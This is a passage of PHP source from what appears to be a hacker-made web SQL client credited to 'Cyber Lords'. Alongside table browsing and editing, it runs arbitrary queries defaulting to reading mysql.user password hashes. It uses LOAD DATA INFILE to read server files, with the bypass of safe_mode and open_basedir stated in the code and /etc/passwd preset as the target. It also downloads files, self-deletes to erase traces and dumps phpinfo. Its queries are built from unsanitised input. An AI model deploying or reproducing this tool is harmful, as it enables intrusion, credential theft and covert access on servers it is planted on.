  $sql = query($id, "CREATE DATABASE `".AlphanumericalClean($new_db)."`");
  if($sql) {
   echo "\n<BR><BR><font color=\"green\">Database <B>".AlphanumericalClean($new_db)."</B> created successfully</font>";
  }
  @sql_free_result($sql);
  unset($sql);
 }
} elseif($act == '05') {
 echo "\n[ <img border=\"0\" src=\"".basename(__FILE__)."?image=tbl\" align=\"center\"> ".$lang[$language.'_text14'].": <B>".AlphanumericalClean($tbl)."</B> ] [ <img border=\"0\" src=\"".basename(__FILE__)."?image=browse_db\" align=\"center\"> ".$lang[$language.'_text7'].": <B><a href=\"".$baseurl."&act=02\">".AlphanumericalClean($db)."</a></B> ]<BR><BR>";
 $quicklaunch = array
   (
    array($lang[$language.'_text16'],$baseurl."&act=05&tbl=".$tbl),
    array($lang[$language.'_text17'],$baseurl."&act=05&tbl=".$tbl."&CODE=00"),
    array($lang[$language.'_text18'],$baseurl."&act=05&tbl=".$tbl."&CODE=01"),
    array($lang[$language.'_text19'],$baseurl."&act=05&tbl=".$tbl."&CODE=04"),
    array($lang[$language.'_text20'],"javascript: confirm_function('".$baseurl."&act=05&tbl=".$tbl."&CODE=02');"),
    array($lang[$language.'_text21'],$baseurl."&act=10&dump=tbl&tbl=".$tbl),
   );
 if (count($quicklaunch) > 0) {
  foreach($quicklaunch as $item) {
   echo "[ <a href=\"".$item[1]."\"><B>".$item[0]."</B></a> ] ";
  };
 }
 if($CODE == '00' && isset($tbl)) {
  $sql = query($id, "SELECT * FROM `".AlphanumericalClean($tbl)."`");
  if(!sql_num_rows($sql)) {
   echo "\n<BR><BR>Table is ampty";
  } else {
   echo "\n<BR><BR><table align=\"center\" width=\"700\">\n<tr align=\"center\">";
   for( $i=0; $i < sql_num_fields($sql); $i++ ) {
    echo "\n <td><B>".sql_field_name($sql,$i)."</B></td>";
   }
   echo "\n <td colspan=\"2\"><B>Action</B></td>\n</tr>";
   while ($row = @sql_fetch_assoc($sql)) {
    $edit = '';
    echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\" align=\"center\">";
    foreach ($row as $key=>$value) {
     echo "\n <td>".substr(htmlspecialchars($value), 0, 64)."</td>";
    }
    foreach ($row as $key=>$value) {
     $edit .= urlencode("`$key`='$value' AND ");
    }
    $pm = substr($edit,"",-5);
    echo "\n <td><a href=\"".$baseurl."&act=05&tbl=".$tbl."&CODE=03&pm=".$pm."\" title=\"Edit row\"><img border=\"0\" src=\"".basename(__FILE__)."?image=edit\" align=\"center\"></a></td>\n <td><a href=\"".$baseurl."&act=09&query=DELETE+FROM+".$tbl."+WHERE+".$pm."\" title=\"Delete row\"><img border=\"0\" src=\"".basename(__FILE__)."?image=drop\" align=\"center\"></a></td>\n</tr>";
    unset($edit);
   }
   echo "\n</table>\n";
  }
  @sql_free_result($sql);
  unset($sql);
 } elseif($CODE == '01') {
  if((isset($values)) && (count($values))) {
   foreach($values as $key=>$value) {
    $fields .= "`".$key."`, ";
    $val .= '"'.$value.'", ';
   }
   $sql = query($id, "INSERT INTO `".$tbl."` ( ".substr($fields,"",-2)." ) VALUES ( ".substr($val,"",-2)." ); ");
   if($sql) {
    echo "\n<BR><BR><font color=\"green\">New row successfull inserted into table  [ <B>".AlphanumericalClean($tbl)."</B> ]<BR>(Last inserted record has id ".mysql_insert_id($id).")</font><BR>";
   }
   @sql_free_result($sql);
   unset($sql);
  } else {
   $sql = query($id, "DESC `".$tbl."`");
   echo "\n<BR><BR>Insert row into table  [ <img border=\"0\" src=\"".basename(__FILE__)."?image=tbl\" align=\"center\"> <B>".AlphanumericalClean($tbl)."</B> ]<BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"act\" value=\"05\">\n<input type=\"hidden\" name=\"CODE\" value=\"01\">\n<input type=\"hidden\" name=\"tbl\" value=\"".$tbl."\">\n<table align=\"center\" border=\"0\" width=\"700\">\n<tr>\n <td>Field</td>\n <td>Type</td>\n <td>Value</td>\n</tr>";
   while ($row = sql_fetch_assoc($sql)) {
    $tmp = $row["Type"]." ".$row["Extra"];
    echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\"> <td>".$row["Field"]."</td> <td>".$tmp."</td> <td align=\"center\"><input type=\"text\" name=\"values[".$row["Field"]."]\" value=\"\"></td></tr>";
   }
   echo "\n</table>\n<input type=\"submit\" value=\"Insert\">\n</form>";
   @sql_free_result($sql);
   unset($sql);
  }
 } elseif($CODE == '02') {
  $sql = query($id, "DROP TABLE `".AlphanumericalClean($tbl)."`");
  if($sql) {
   echo "\n<BR><BR><font color=\"green\">Table <B>".AlphanumericalClean($tbl)."</B> deleted successfully</font>";
  }
  @sql_free_result($sql);
  unset($sql);
 } elseif($CODE == '03') {
  if(count($values)) {
   foreach($values as $key=>$value) {
    $edit .= "`".$key."` = '".$value."', ";
   }
   $sql = query($id, "UPDATE `".AlphanumericalClean($tbl)."` SET ".substr($edit,"",-2)." WHERE ".stripslashes(urldecode($pm))."");
   if($sql) {
    echo "\n<BR><BR><font color=\"green\">Successfull saved</font><BR>";
   }
   @sql_free_result($sql);
   unset($sql);
  } else {
   $sql = query($id, "SELECT * FROM `".AlphanumericalClean($tbl)."` WHERE $pm LIMIT 1");
   echo "\n<BR><BR>Insert row into table  [ <B>".AlphanumericalClean($tbl)."</B> ]<BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"act\" value=\"05\"><input type=\"hidden\" name=\"pm\" value=\"".$pm."\">\n<input type=\"hidden\" name=\"CODE\" value=\"03\">\n<input type=\"hidden\" name=\"tbl\" value=\"".$tbl."\">\n<table align=\"center\" border=\"0\" width=\"700\">\n<tr>\n <td>Field</td>\n <td>Value</td>\n</tr>";
   while ($row = sql_fetch_assoc($sql)) {
    foreach($row as $key=> $value) {
     echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\"> <td>".$key."</td> <td align=\"center\"><input type=\"text\" name=\"values[".$key."]\" value=\"".$value."\"></td></tr>";
    }
   }
   echo "\n</table>\n<input type=\"submit\" value=\"Save\">\n</form>\n";
   @sql_free_result($sql);
   unset($sql);
  }
 } elseif($CODE == '04') {
  if(count($values) && isset($values)) {
   foreach($values as $key=>$value) {
    $edit .= " MODIFY `".$key."` ".$value.", ";
   }
   $sql = query($id, "ALTER TABLE `".AlphanumericalClean($tbl)."` ".substr(stripslashes($edit),"",-2)."; ");
   if($sql) {
    echo "\n<BR><BR><font color=\"green\">Successfull saved</font><BR>";
   }
   @sql_free_result($sql);
   unset($sql);
  } else {
   $sql = query($id, "DESC `".AlphanumericalClean($tbl)."`");
   echo "\n<BR><BR>Alter table  [ <B>".AlphanumericalClean($tbl)."</B> ]<form method=\"post\" action=\"".basename(__FILE__)."\"><input type=\"hidden\" name=\"login\" value=\"".$login."\"><input type=\"hidden\" name=\"password\" value=\"".$password."\"><input type=\"hidden\" name=\"server\" value=\"".$server ."\"><input type=\"hidden\" name=\"port\" value=\"".$port ."\"><input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\"><input type=\"hidden\" name=\"db\" value=\"".$db."\"><input type=\"hidden\" name=\"act\" value=\"05\"><input type=\"hidden\" name=\"CODE\" value=\"04\"><input type=\"hidden\" name=\"tbl\" value=\"".$tbl."\">\n<BR><table align=\"center\" border=\"0\" width=\"700\">\n<tr>\n <td>Field</td>\n <td>Type</td>\n</tr>";
   while ($row = sql_fetch_assoc($sql)) {
    $tmp = $row["Type"]." ".$row["Extra"];
    echo "\n<tr>\n <td>".$row["Field"]."</td>\n <td><input type=\"text\" name=\"values[".$row["Field"]."]\" value=\"".$tmp."\"></td>\n</tr>";
    unset($tmp);
   }
   echo "\n</table>\n<input type=\"submit\" value=\"Save\">\n";
  }
 } else {
  $quicklaunch = array(
   array("Add new column",$baseurl."&act=05&tbl=".$tbl),
  );
  $sql = query($id, "DESC `".AlphanumericalClean($tbl)."`");
  if(!sql_num_fields($sql)) {
   echo "\n<BR><BR>Table is ampty";
  } else {
   echo "\n<BR><BR>Структура таблицы [ <B>".AlphanumericalClean($tbl)."</B> ]\n<BR>\n<table align=\"center\" border=\"0\" width=\"700\">\n<tr align=\"center\">\n <td>Field</td>\n <td>Type</td>\n <td>NULL</td>\n <td>Key</td>\n <td>Default</td>\n <td>Extra</td>\n <td colspan=\"5\">Action</td>\n</tr>";
   while ($row = sql_fetch_assoc($sql)) {
    echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\">";
    foreach ($row as $field =>$value) {
     echo "\n <td>".$value."</td>";
    }
    echo "\n <td><a href=\"".$baseurl."&act=09&query=".urlencode("ALTER TABLE `".$tbl."` ADD INDEX ( ".$row["Field"].")")."\" title=\"ADD INDEX KEY\"><img border=\"0\" src=\"".basename(__FILE__)."?image=index\" align=\"center\"></a></td> <td><a href=\"".$baseurl."&act=09&query=".urlencode("ALTER TABLE `".$tbl."` DROP INDEX ".$row["Field"])."\" title=\"DROP INDEX ".$row["Field"]."\"><img border=\"0\" src=\"".basename(__FILE__)."?image=empty\" align=\"center\"></a></td> <td><a href=\"".$baseurl."&act=09&query=".urlencode("ALTER TABLE `".$tbl."` ADD PRIMARY KEY ( ".$row["Field"].")")."\" title=\"ADD PRIMARY KEY\"><img border=\"0\" src=\"".basename(__FILE__)."?image=primary\" align=\"center\"></a></td> <td><a href=\"".$baseurl."&act=09&query=".urlencode("ALTER TABLE `".$tbl."` DROP PRIMARY KEY ")."\" title=\" DROP PRIMARY KEY column ".$row["Field"]."\"><img border=\"0\" src=\"".basename(__FILE__)."?image=empty\" align=\"center\"></a></td> <td><a href=\"javascript: confirm_function('".$baseurl."&act=09&query=".urlencode("ALTER TABLE `".$tbl."` DROP COLUMN ".$row["Field"])."');\" title=\" Delete column ".$row["Field"]."\"><img border=\"0\" src=\"".basename(__FILE__)."?image=drop\" align=\"center\"></a></td></tr>";
   }
   echo "\n</table>";
  }
  // if (count($quicklaunch) > 0) {foreach($quicklaunch as $item) {$str .= "[ <a href=\"".$item[1]."\"><B>".$item[0]."</B></a> ] ";};} [-]
  @sql_free_result($sql);
  unset($sql);
 }
} elseif($act == '06') {
 $sql = query($id, "DROP TABLE `".AlphanumericalClean($tbl)."`");
 if($sql) {
  echo "\n<BR><BR><font color=\"green\">Table <B>".AlphanumericalClean($tbl)."</B> deleted successfully</font>";
 }
 @sql_free_result($sql);
 unset($sql);
} elseif($act == '07') {
 if(!isset($new_tbl)) {
  echo "\n<BR><BR><B>Create new Table</B><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"act\" value=\"07\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\nTable name: <input type=\"text\" name=\"new_tbl\" value=\"\" maxlength=\"10\">\n<BR>Table rows: <input type=\"text\" name=\"rows\" value=\"\" maxlength=\"10\">\n<BR><input type=\"submit\" value=\"create\">\n</form>";
 } else {
  if(!isset($field_name)) {
   if(!isset($rows)) {
    echo "Введите кол-во строк";
    exit;
   }
   echo "\n<BR><BR><B>Create new Table</B><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"act\" value=\"07\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"new_tbl\" value=\"".$new_tbl."\">\n<input type=\"hidden\" name=\"rows\" value=\"".$rows."\">\n<table>\n<tr>\n <td><B>Field</B></td>\n <td><B>Type</B></td>\n <td><B>Length</B></td>\n <td><B>Atributes</B></td>\n <td><B>NULL</B></td>\n <td><B>Defailt</B></td>\n <td><B>DOP</B></td>\n <td><B>KEYS</B></td>\n</tr>";
   for($i=0; $i < $rows; $i++) {
    echo "\n<tr align=\"center\" bgcolor=\"#DDDDDD\">\n <td><input type=\"text\" name=\"field_name[]\" size=\"10\" value=\"\"></td>\n <td><select name=\"field_type[]\" width=\"3\"><option value=\"VARCHAR\">VARCHAR</option><option value=\"TINYINT\">TINYINT</option> <option value=\"TEXT\">TEXT</option><option value=\"DATE\">DATE</option><option value=\"SMALLINT\">SMALLINT</option><option value=\"MEDIUMINT\">MEDIUMINT</option><option value=\"INT\">INT</option><option value=\"BIGINT\">BIGINT</option><option value=\"FLOAT\">FLOAT</option><option value=\"DOUBLE\">DOUBLE</option><option value=\"DECIMAL\">DECIMAL</option> <option value=\"DATETIME\">DATETIME</option><option value=\"TIMESTAMP\">TIMESTAMP</option><option value=\"TIME\">TIME</option><option value=\"YEAR\">YEAR</option><option value=\"CHAR\">CHAR</option><option value=\"TINYBLOB\">TINYBLOB</option><option value=\"TINYTEXT\">TINYTEXT</option><option value=\"BLOB\">BLOB</option><option value=\"MEDIUMBLOB\">MEDIUMBLOB</option><option value=\"MEDIUMTEXT\">MEDIUMTEXT</option><option value=\"LONGBLOB\">LONGBLOB</option><option value=\"LONGTEXT\">LONGTEXT</option><option value=\"ENUM\">ENUM</option><option value=\"SET\">SET</option></select></td> <td><input type=\"text\" name=\"field_length[]\" size=\"6\" value=\"\"></td>\n <td><select name=\"field_attribute[]\"><option value=\"\" selected=\"selected\"></option><option value=\"BINARY\">BINARY</option><option value=\"UNSIGNED\">UNSIGNED</option><option value=\"UNSIGNED ZEROFILL\">UNS-D ZEROFILL</option></select></td> <td><select name=\"field_null[]\"><option value=\"NOT NULL\">not null</option><option value=\"\">null</option></select></td>\n <td><input type=\"text\" name=\"field_default[]\" size=\"14\" value=\"\"></td>\n <td><select name=\"field_extra[]\"><option value=\"\"></option><option value=\"AUTO_INCREMENT\">auto_increment</option></select></td>\n <td align=\"center\"><select name=\"field_key[]\"><option value=\"\"></option><option value=\"PRIMARY\">PRIMARY</option><option value=\"INDEX\">INDEX</option><option value=\"UNIQUE\">UNIQUE</option></select></td>\n</tr>";
   }
   echo "\n</table>\n<BR><input type=\"submit\" value=\"create\">\n</form>";
  } else {
   for($q=0; $q < count($field_name); $q++) {
    if($field_name[$q]) {
     $value .= " `".$field_name[$q]."`";
    }
    if($field_length[$q]) {
     $field_length[$q] = "( ".$field_length[$q] ." )";
    }
    if($field_type[$q]) {
     $value .= " ".$field_type[$q].$field_length[$q];
    }
    if($field_attribute[$q]) {
     $value .= " ".htmlspecialchars($field_attribute[$q]);
    }
    if($field_null[$q]) {
     $value .= " ".htmlspecialchars($field_null[$q]);
    }
    if($field_default[$q]) {
     $value .= " DEFAULT '".htmlspecialchars($field_default[$q])."'" ;
    }
    $value .= ", ";
   }
   $sql = query($id, "CREATE TABLE `".AlphanumericalClean($new_tbl)."` ( ".$value." )");
   if($sql) {
    echo "\n<BR><BR><font color=\"green\">Table ".AlphanumericalClean($new_tbl)." created successfully</font>";
   } else {
    echo "\n<BR><BR><font color=\"red\">Table ".AlphanumericalClean($new_tbl)." not created</font>";
   }
   @sql_free_result($sql);
   unset($sql);
  }
 }
} elseif($act == '08') {
  if(isset($pid)) {
   if(!is_numeric(AlphanumericalClean($pid))) {
    echo "\n<B>Warning!!!</B> Bad proccess ID format";
   }
   $sql = query($id, "KILL ".AlphanumericalClean($pid));
   if($sql) {
    echo "<BR><head><META HTTP-EQUIV='Refresh' CONTENT='2;url=javascript:history.go(-1)'></head><BR><BR><font color=\"green\"><B>Process #: ".intval($pid)." successfull killed</B></font>";
   }
   @sql_free_result($sql);
   unset($sql);
  }
  $sql = sql_list_processes($id);
  echo "<B>".$lang[$language.'_text5']."</B><BR>";
  echo "\n<table border=\"0\" width=\"700\">\n<tr align=\"center\">";
  for($i=0; $i < sql_num_fields($sql); $i++) {
   echo "\n <td>".sql_field_name($sql,$i)."</td>";
  }
  echo "\n <td>Action</td>\n</tr>";
  while($row = sql_fetch_assoc($sql) ) {
   echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\" align=\"center\"> <td>".$row["Id"]."</td> <td>".$row["User"]."</td> <td>".$row["Host"]."</td> <td>".$row["db"]."</td> <td>".$row["Command"]."</td> <td>".$row["Time"]."</td> <td>".$row["State"]."</td> <td>".$row["Info"]."</td> <td><a href=\"javascript: confirm_function('".$baseurl."&act=08&pid=".$row["Id"]."');\"><img src=\"".basename(__FILE__)."?image=drop\" align=\"absmiddle\"></a></td></tr>";
  }
  echo "\n</table>\n";
  @sql_free_result($sql);
  unset($sql);
} elseif($act == '09') {
  if(isset($query)) {
   $sql = query($id, $query);
   if($sql) {
    if(!is_resource($sql)) {
     echo "<BR><font color=\"green\">Query successfull send</font><BR><BR>[ Affected rows: <B>".sql_affected_rows()."</B> ]<BR>";
    } else {
     echo "<BR><font color=\"green\">Query successfull execute</font><BR><BR><table align=\"center\" width=\"700\"><tr>";
     for( $i=0; $i < sql_num_fields($sql); $i++ ) {
      echo " <td><B>".sql_field_name($sql,$i)."</B></td>";
     }
     echo "</tr>";
     while ($row = @sql_fetch_assoc($sql)) {
      echo  "<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\">";
      foreach ($row as $key=>$value) {
       echo " <td>".htmlspecialchars($value)."</td>";
      }
      echo  "</tr>";
     }
     echo "</table>";
    }
   }
  } else {
   echo "<img border=\"0\" src=\"".basename(__FILE__)."?image=sql\">&nbsp;<B>".$lang[$language.'_text2']."</B><BR><table border=\"0\" width=\"700\"><tr align=\"center\"> <td><BR><form method=\"post\"action=\"".basename(__FILE__)."\"><input type=\"hidden\" name=\"login\" value=\"".$login."\"><input type=\"hidden\" name=\"password\" value=\"".$password."\"><input type=\"hidden\" name=\"server\" value=\"".$server ."\"><input type=\"hidden\" name=\"port\" value=\"".$port ."\"><input type=\"hidden\" name=\"login\" value=\"".$login."\"><input type=\"hidden\" name=\"password\" value=\"".$password."\"><input type=\"hidden\" name=\"server\" value=\"".$server ."\"><input type=\"hidden\" name=\"port\" value=\"".$port ."\"><input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\"><input type=\"hidden\" name=\"db\" value=\"".$db."\"><input type=\"hidden\" name=\"act\" value=\"09\"><textarea name=\"query\" cols=\"60\" rows=\"10\">SELECT * FROM mysql.user;</textarea><BR><input type=\"submit\" value=\"Execute\"></form></td></tr></table>";
  }
  @sql_free_result($sql);
  unset($sql);
} elseif($act == '10') {
  switch($dump) {
   case "db":
    echo (dump_db($id, $db, & $type));
   break;
   case "tbl":
    echo (dump_tbl($id, $tbl, & $type));
   break;  // Other variants
   default:
    echo "<BR><BR><B>Warning!!!</B>Unknown dump format";
   break;
  }
} elseif($act == '11') {
 if(isset($file) && !empty($file)) {
  if(file_exists($file) and  is_readable($file)) {
   $tmptbl = rand();
   query($id, 'CREATE TABLE `'.$tmptbl.'` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );');
   query($id, "LOAD DATA INFILE \"".addslashes($file)."\" INTO TABLE `".$tmptbl."`");
   $sql = query($id, "SELECT * FROM `".$tmptbl."`");
   if(sql_num_rows($sql)) {
    for ($i=0; $i < sql_num_fields($sql);$i++){
     $field_name = sql_field_name($sql,$i);
    }
    echo "\n<table border=\"0\" width=\"700\">\n<tr align=\"center\"> \n<td>".$field_name."</td>\n</tr>\n<tr> \n<td>";
    while ($row = sql_fetch_array($sql)) {
     foreach ($row as $key =>$value) {
      echo htmlspecialchars($value)."<br>";
     }
    }
    @sql_free_result($sql);
    unset($sql);
    echo " \n</td>\n</tr>\n</table>";
   } else {
    echo "<BR><BR><B><font color=\"red\">".$lang[$language.'_text28']."</font></B><BR>";
   }
  } else {
   echo "<BR><BR><B><font color=\"red\">".$lang[$language.'_text27']."</font></B><BR>";  
  }
 } else {
  echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=download\">&nbsp;<B>".$lang[$language.'_text11']."</B>\n<BR><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"act\" value=\"11\">Полный путь к файлу: <input type=\"text\" name=\"file\" value=\"/etc/passwd\" size=\"40\"><input type=\"submit\" value=\"".$lang[$language.'_text11']."\"></form>";
 }
} elseif($act == '12') {
 if(isset($file) && !empty($file)) {
  if(file_exists($file) and  is_readable($file)) {
   downloadfile($file);
  } else {
   echo "<BR><BR><B><font color=\"red\">".$lang[$language.'_text27']."</font></B><BR>";  
  }
 } else {
  echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=download\">&nbsp;<B>".$lang[$language.'_text26']."</B>\n<BR><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"act\" value=\"12\">Полный путь к файлу: <input type=\"text\" name=\"file\" value=\"/etc/passwd\" size=\"40\"><input type=\"submit\" value=\"".$lang[$language.'_text26']."\"></form>";
 }
} elseif($act == '13') {
 if(isset($rnd) && $rnd == $rndcode) {
  if (unlink(__FILE__)) {
   @ob_clean(); 
   die( $lang[$language.'_text31'] ); 
  } else {
   echo "<center><b><font colr=\"red\">Can't delete ".__FILE__."!</font></b></center>";
  }
 } else {
  $rnd = rand(0,9).rand(0,9).rand(0,9).rand(0,9);
  echo "<BR><BR><form method=\"POST\"><B>Self-remove: </B><font color=\"green\">".__FILE__."</font><BR>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=\"hidden\" name=\"rndcode\" value=\"".$rnd."\"><input type=\"text\" name=\"rnd\" value=\"\">&nbsp;<input type=\"submit\" value=\"YES\"></form>";
 }
} elseif($act == '14') {
 @ob_clean();
 die(phpinfo());
} else {
 echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=host\">&nbsp;<B>".$lang[$language.'_text29']."</B>\n<BR><table>";
 foreach(server_info() as $key=>$value) {
  echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\">\n <td>".$key.":</td>\n <td>".$value."</td>\n</tr>";
 }
 echo "\n</table>";
}

//--------------------------------
//  HTML (footer)
//--------------------------------
//
echo "<BR><BR>\n</center>\n</td>\n</tr>\n</table><table border=\"1\" width=\"960\">\n<tr align=\"center\">\n <td>--[ <a href=\"http://cyberlords.net\" target=\"new\"><font color=\"green\">Copyright © Cyber Lords</font></a> | CL SQL Client ".$version." | All bugs send to ICQ #899125 <a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=899125\"><img src=\"http://wwp.icq.com/scripts/online.dll?icq=899125&img=5\" border=\"0\" align=\"absmiddle\"></a> | Generation time: ".round(get_micro_time()-start_time,4)." ]--</td>\n</tr>\n</table>\n</body>\n</html>";

// Stop Buffering
@ob_end_flush();
?>